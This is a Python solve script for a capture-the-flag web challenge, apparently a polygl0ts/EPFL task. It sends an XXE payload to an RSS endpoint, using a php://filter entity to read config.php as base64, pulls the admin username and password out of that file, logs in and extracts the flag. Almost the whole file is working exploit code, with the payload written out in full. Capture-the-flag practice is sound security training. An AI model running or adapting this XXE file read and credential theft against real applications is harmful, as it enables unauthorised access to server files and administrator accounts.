import requests
import sys
import base64
import re


def solve():
    # base_url = "http://localhost:8085"
    base_url = "https://challs.polygl0ts.ch:8085"
    if len(sys.argv) > 1:
        base_url = sys.argv[1]
    if "http" not in base_url:
        base_url = "http://" + base_url

    print(f"[*] Targeting {base_url}")

    # Step 1: XXE to read config.php
    print("[+] Step 1: Exploiting XXE to read config.php...")
    rss_url = f"{base_url}/rss.php"

    # Payload to read config.php using php://filter to base64 encode it
    # We target the 'title' tag for exfiltration
    xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php">
]>
<rss version="2.0">
    <channel>
        <title>&xxe;</title>
        <description>Le Canard Feed</description>
    </channel>
</rss>
"""

    try:
        response = requests.post(rss_url, data={"rss_content": xxe_payload}, timeout=5)

        # Extract the Base64 string from the response
        # It should be inside <p><strong>title:</strong> ... </p>
        match = re.search(r"<strong>title:</strong>\s*(.*?)\s*</p>", response.text)
        if not match:
            print("[-] Failed to extract Base64 content from response.")
            print(f"Response: {response.text}")
            sys.exit(1)

        b64_content = match.group(1)
        print(f"[+] Extracted Base64 content: {b64_content[:20]}...")

        config_content = base64.b64decode(b64_content).decode("utf-8")
        print("[+] Decoded config.php")

    except Exception as e:
        print(f"[-] Error during XXE exploit: {e}")
        sys.exit(1)

    # Step 2: Extract Credentials
    print("[+] Step 2: Extracting credentials...")
    username_match = re.search(
        r"\$ADMIN_USERNAME\s*=\s*['\"](.*?)['\"];", config_content
    )
    password_match = re.search(
        r"\$ADMIN_PASSWORD\s*=\s*['\"](.*?)['\"];", config_content
    )

    if not username_match or not password_match:
        print("[-] Failed to find credentials in config.php")
        sys.exit(1)

    username = username_match.group(1)
    password = password_match.group(1)
    print(f"[+] Found credentials: {username} / {password}")

    # Step 3: Login and Get Flag
    print("[+] Step 3: Logging in to retrieve flag...")
    admin_url = f"{base_url}/admin.php"
    session = requests.Session()

    login_data = {"username": username, "password": password}

    response = session.post(admin_url, data=login_data)

    if "Welcome" in response.text:
        print("[+] Login successful!")
        # Extract flag
        flag_match = re.search(r"(?:EPFL|flag)\{.*?\}", response.text)
        if flag_match:
            print(f"\n[SUCCESS] Flag: {flag_match.group(0)}\n")
        else:
            print("[-] Login successful but flag not found on page.")
            # Maybe it's in a specific element
            print(response.text[:500])
    else:
        print("[-] Login failed.")
        sys.exit(1)


if __name__ == "__main__":
    solve()
